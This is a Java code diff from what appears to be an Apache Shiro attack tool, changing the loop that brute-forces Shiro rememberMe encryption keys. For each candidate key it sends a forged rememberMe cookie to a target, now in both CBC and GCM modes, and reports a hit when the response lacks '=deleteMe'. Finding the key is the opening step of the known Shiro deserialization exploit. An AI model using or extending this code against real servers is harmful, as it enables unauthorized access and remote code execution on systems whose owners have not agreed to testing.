@@ -1313,36 +1313,40 @@ public class MainController {
                     String shirokey = keys.get(i);
                     updateMessage(shirokey);
                     updateProgress(i, total);
-                    try {
-                        String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, MainController.this.attackService.shiroKeyWord, shirokey);
-                        HashMap<String, String> header = new HashMap<String, String>();
-                        header.put("Cookie", rememberMe);
-                        String result = MainController.this.attackService.headerHttpRequest(header);
-                        Thread.sleep(100L);
-                        boolean matched;
-                        if (multiShiroMode) {
-                            matched = result != null && !result.isEmpty() && MainController.this.attackService.countDeleteMe(result) < MainController.this.attackService.flagCount;
-                        } else {
-                            matched = result != null && !result.isEmpty() && !result.contains("=deleteMe");
+                    boolean found = false;
+                    for (int cipherType = 0; cipherType <= 1 && !found; cipherType++) {
+                        try {
+                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, MainController.this.attackService.shiroKeyWord, shirokey, cipherType);
+                            HashMap<String, String> header = new HashMap<String, String>();
+                            header.put("Cookie", rememberMe);
+                            String result = MainController.this.attackService.headerHttpRequest(header);
+                            Thread.sleep(100L);
+                            boolean matched;
+                            if (multiShiroMode) {
+                                matched = result != null && !result.isEmpty() && MainController.this.attackService.countDeleteMe(result) < MainController.this.attackService.flagCount;
+                            } else {
+                                matched = result != null && !result.isEmpty() && !result.contains("=deleteMe");
+                            }
+                            if (matched) {
+                                AttackService.realShiroKey = shirokey;
+                                final String foundKey = shirokey;
+                                final int matchType = cipherType;
+                                Platform.runLater(() -> {
+                                    MainController.this.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey + (matchType == 1 ? " (GCM)" : " (CBC)")));
+                                    MainController.this.shiroKey.setText(foundKey);
+                                });
+                                updateProgress(i + 1, total);
+                                updateMessage("命中: " + shirokey + (cipherType == 1 ? " (GCM)" : " (CBC)"));
+                                found = true;
+                            }
+                        } catch (Exception ex) {
                         }
-                        if (matched) {
-                            AttackService.realShiroKey = shirokey;
-                            final String foundKey = shirokey;
-                            Platform.runLater(() -> {
-                                MainController.this.logTextArea.appendText(Utils.log("[++] 找到key：" + foundKey));
-                                MainController.this.shiroKey.setText(foundKey);
-                            });
-                            updateProgress(i + 1, total);
-                            updateMessage("命中: " + shirokey);
-                            return true;
-                        }
-                        final String failKey = shirokey;
-                        Platform.runLater(() -> MainController.this.logTextArea.appendText(Utils.log("[-] " + failKey)));
-                    } catch (Exception ex) {
-                        final String failKey = shirokey;
-                        final String errMsg = ex.getMessage();
-                        Platform.runLater(() -> MainController.this.logTextArea.appendText(Utils.log("[-] " + failKey + " " + errMsg)));
                     }
+                    if (found) {
+                        return true;
+                    }
+                    final String failKey = shirokey;
+                    Platform.runLater(() -> MainController.this.logTextArea.appendText(Utils.log("[-] " + failKey)));
                 }
                 updateProgress(total, total);
                 updateMessage("未找到可用 Key");
